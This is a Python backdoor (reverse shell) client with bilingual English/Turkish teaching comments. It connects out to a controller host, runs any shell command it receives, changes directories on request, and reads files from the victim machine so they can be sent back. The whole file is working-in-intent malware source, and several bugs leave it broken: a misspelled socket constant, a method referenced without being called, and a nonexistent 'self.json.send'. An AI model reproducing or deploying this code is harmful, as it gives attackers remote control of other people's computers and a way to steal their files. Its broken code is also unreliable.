import socket
import subprocess
import json
import os

class MySocket:
    def __init__(self,ip,port):
        self.my_connection = socket.socket(socket.AF_INET,socket.SOC_STREAM)#We create a socket instance where we specify which network family we work with and in which way we will transfer data.--Hangi ağ ailesi ile çalışacağımızı ve hangi yol ile veri aktaracağımızı belirlediğimiz bir soket örneği oluşturuyoruz. 
        self.my_connection.connect((ip,port))

 #In order for the sent and received data to be understood and processed more properly, we write the following two functions in order to send the data with json packets.--Gönderilen ve alınan verilerin daha doğru anlaşılması ve işlenebilmesi için json paketleri ile veri göndermek için aşağıdaki iki işlevi yazıyoruz.
    def json_send(self, data):
        json_data = json.dumps(data)
        self.my_connection.send(json_data)
    
    def json_receive(self):
        json_data = ""
        while True:#-We will ensure that the read files continue until they are finished.-Okunan dosyaların bitene kadar devam etmesini sağlayacağız.
            try:
                json_data = json_data + self.my_connection.recv(1024)            
                return json.loads(json_data) 
            except ValueError:
                continue
 #In order to change the directory in the backdoor application, we need to make the cd command available.--Arka kapı uygulamasında dizini değiştirmek için cd komutunu kullanılabilir hale getirmemiz gerekiyor.   
    def command_directory(self,directory):#We write this function to add the "change directory" feature to the cd command.--Bu işlevi cd komutuna "dizin değiştir" özelliğini eklemek için yazıyoruz.
        os.chdir(directory)
        return "Cd to " + directory
    
    
    def get_file_content(self,path):
        with open(path, "rb") as myfile:#We find the file to be downloaded on the target computer, read it as binary and save it in a file named myfile.--Hedef bilgisayarda indirilecek dosyayı bulup ikili olarak okuyor ve myfile adlı bir dosyaya kaydediyoruz.
            return myfile.read()
    
    def command_execution(self,command):
        return subprocess.check_output(command, shell = True)#We write a function that processes the incoming commands on our target computer.--Hedef bilgisayarımıza gelen komutları işleyen bir fonksiyon yazıyoruz.



#my_connection.send("Connection OK")#In order to test our connection, we first send a message to our host.--Bağlantımızı test etmek için önce ana makineye bir mesaj gönderiyoruz.

    def start_backdoor(self):
        
    
        while True:#To keep our connection continuous, we open a while true loop.--Bağlantımızı sürekli tutmak için bir süre gerçek döngü açıyoruz.
            
            command = self.json_receive#We create variables using the recv method and we can add commands from the host to this variable.--Recv metodu kullanarak değişkenler oluşturuyoruz ve ana bilgisayardan bu değişkene komutlar ekleyebiliyoruz.
            if command[0] == "quit":
                self.my_connection.close()
                exit()
            elif command[0] == "cd" and len(command)>1:
                command_output = self.command_directory(command[1])
            elif command[0] == "downloads":
                command_output = self.get_file_content(command[1])
                
            else:
                command_output = self.command_execution(command)#We assign an output of the command execution function to the variable.--Değişkene komut yürütme işlevinin bir çıktısını atarız.
            self.json.send(command_output)#We send the command output to the host computer with the send method.--Komut çıktısını, gönderme yöntemi ile ana bilgisayara gönderiyoruz.
        self.my_connection.close()
socket_object=MySocket("10.0.2.7", 8080)
socket_object.start_backdoor()